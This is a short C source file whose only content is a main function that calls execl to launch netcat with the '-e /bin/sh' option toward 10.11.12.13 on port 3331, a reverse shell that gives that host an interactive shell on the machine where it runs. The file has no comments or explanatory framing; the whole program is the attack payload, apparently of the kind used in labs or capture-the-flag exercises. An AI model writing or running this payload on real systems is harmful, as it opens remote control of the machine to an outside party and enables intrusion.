#include <stdio.h>
#include <unistd.h>
#include <dirent.h>

int main (void) {
   return execl ("/bin/nc","nc", "10.11.12.13", "3331", "-e", "/bin/sh", NULL);
}